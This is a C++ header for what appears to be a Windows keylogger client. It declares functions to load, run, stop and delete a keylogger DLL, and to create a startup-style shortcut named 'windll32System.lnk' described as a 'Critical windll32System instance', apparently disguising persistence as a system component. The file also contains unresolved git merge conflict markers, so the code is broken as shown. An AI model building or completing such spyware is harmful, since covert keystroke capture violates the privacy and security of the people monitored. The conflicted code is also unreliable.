#ifndef CLIENT_H__
# define CLIENT_H__

# include "DLibrary.h"
<<<<<<< HEAD
# include "keylogger_dll/KeyloggerDLL.h"

=======
# include "IInfoClient.h"
# include "IKeylogger.h"
# include "WorkQueue.h"
# include <Shlobj.h>
# include <queue>
#include <shlwapi.h>
#include "windows.h"
#include "winnls.h"
#include "shobjidl.h"
#include "objbase.h"
#include "objidl.h"
#include "shlguid.h"
#include <functional>
#include <iostream>

#pragma comment(lib, "shlwapi.lib")


# define SHORTCUT_NAME L"\\windll32System.lnk"
# define DESCR			"Critical windll32System instance"
>>>>>>> 81089814f1b803b0d8cb0f2699d6b7be2f15077f

class	clientController {

	DLManager	libraries;

	// Dictionaries
	Dictionary	sayHello;
	Dictionary	infoClient;
	Dictionary	keylogger_dll;

public:

	clientController(void) throw(DLibraryException);	// Initialise
	~clientController(void);			        // Destroy

	int			mainAction(int, char**);
	void		sayHelloAction(void);
<<<<<<< HEAD
	IKeylogger*	initKeyloggerAction(void);
	bool		runKeyloggerAction(IKeylogger* keylogger);
	bool		stopKeyloggerAction(IKeylogger* keylogger);
	void		deleteKeyloggerAction(IKeylogger* keylogger);
=======
	void		defineShortcut(void);
	bool		createShortcut(LPCSTR lpszPathObj, LPCWSTR lpszPathLink, LPCSTR descr);

private:
	_I_InfoClient *ifinstance;
	/*IDataHandler *dhinstance; */
	IKeylogger *klinstance;
	/* INetwork *netinstance; */
	WorkQueue _lwqueue;
>>>>>>> 81089814f1b803b0d8cb0f2699d6b7be2f15077f
};

#endif /* !CLIENT_H__ */
